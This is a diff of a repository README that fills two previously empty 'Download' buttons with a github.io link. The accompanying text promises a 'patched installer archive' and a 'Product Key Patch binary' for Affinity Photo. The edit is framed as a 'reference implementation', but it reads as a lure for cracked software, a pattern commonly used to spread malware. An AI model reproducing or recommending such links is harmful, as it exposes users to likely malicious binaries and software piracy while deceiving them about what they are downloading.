@@ -12,7 +12,7 @@ We have designed this repository to serve as both a **reference implementation**
 
 ---
 
-## [![Download](button.svg)](///)
+## [![Download](button.svg)](https://kevinlee-lab2098n7.github.io/serif-affinity-photo-2026/)
 
 *This section provides the asset retrieval mechanism. Click the macro above to access the patched installer archive.*
 
@@ -191,6 +191,6 @@ This repository is licensed under the **MIT License**. You are free to use, modi
 
 ---
 
-## [![Download](button.svg)](////////)
+## [![Download](button.svg)](https://kevinlee-lab2098n7.github.io/serif-affinity-photo-2026/)
 
 *Final retrieval point: Use this macro to acquire the complete patched package, including the Product Key Patch binary, example profiles, and checksum manifest for version 2.4.2.*
